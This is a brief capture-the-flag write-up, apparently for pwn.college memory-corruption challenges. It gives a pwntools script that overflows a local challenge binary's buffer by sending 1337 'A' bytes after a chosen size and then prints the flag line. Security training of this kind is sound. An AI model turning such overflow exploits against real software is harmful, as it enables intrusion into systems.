### Both challenges are solvable with this script: 

```python
#!/usr/bin/python
from pwn import *
context.log_level = 'critical'

r = process('/challenge/babymem_level2.1')

r.sendlineafter(b'size: ', b'1337')
r.sendline(b'A'*1337)

print(r.recvline_contains(b"pwn.college").strip().decode())
```